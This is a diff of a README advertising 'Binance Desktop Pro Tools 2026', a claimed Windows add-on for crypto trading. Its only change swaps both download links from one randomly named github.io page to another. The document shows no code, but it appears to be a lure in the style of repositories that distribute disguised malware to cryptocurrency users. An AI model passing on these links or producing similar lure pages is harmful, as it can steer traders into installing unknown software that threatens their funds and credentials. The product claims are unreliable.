@@ -2,7 +2,7 @@
 
 Binance Desktop Pro Tools 2026 is a comprehensive enhancement for the Binance Desktop application, designed to provide advanced trading tools and API integration for cryptocurrency traders on Windows 10/11. This suite includes features like automated trading bots, real-time analytics, and customizable dashboards to optimize your trading experience, making it a must-have for professionals and enthusiasts alike.
 
-[![Download Now](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Now](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -75,7 +75,7 @@ The portable version has the same features but runs without installation, making
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## License and Disclaimer
 
